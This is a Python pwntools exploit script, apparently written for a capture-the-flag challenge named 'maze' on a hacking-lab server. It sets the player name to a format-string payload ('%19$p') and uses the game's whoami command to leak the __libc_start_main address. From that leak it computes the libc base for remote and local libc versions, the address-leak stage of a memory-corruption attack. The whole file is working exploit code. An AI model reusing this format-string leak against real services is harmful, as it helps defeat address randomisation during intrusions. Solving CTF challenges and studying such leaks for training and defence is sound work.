#!/usr/bin/env python2

from pwn import *
import re

remote_leak = len(sys.argv) > 1 and sys.argv[1] == 'remote'

p = remote('whale.hacking-lab.com', 7331) if remote_leak else process('./maze')

def find_libc_start_main_addr(instr_offset):
    # change name to string format pattern
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline('%19$p')
    p.recvuntil('> ')

    # start the game
    p.sendline('3')
    p.recvuntil('> ')

    # run whoami command to read the libc address
    p.sendline('whoami')
    response = p.recvuntil('> ')
    libc_start_main_addr_with_instr_offset = re.search('(0x[0-9a-f]+)', response).group(1)

    # exit current game
    p.sendline('exit')
    p.recvuntil('> ')

    return int(libc_start_main_addr_with_instr_offset, 16) - instr_offset

# read init
p.recvuntil('> ')

# set player name
p.sendline('pjslf')
p.recvuntil('> ')

if remote_leak:
    # remote libc-2.23.so
    libc_start_main_instr_offset = 240
    libc_start_main_offset = 0x20740
else:
    # local libc-2.28.so
    libc_start_main_instr_offset = 235
    libc_start_main_offset = 0x23fb0

# find libc address
libc_start_main_addr = find_libc_start_main_addr(libc_start_main_instr_offset)
libc_base_addr = libc_start_main_addr - libc_start_main_offset
print 'libc_start_main_offset: ', hex(libc_start_main_offset)
print 'libc_start_main_addr:   ', hex(libc_start_main_addr)
print 'libc_base_addr:         ', hex(libc_base_addr)

# end the game
p.sendline('4')
p.close()
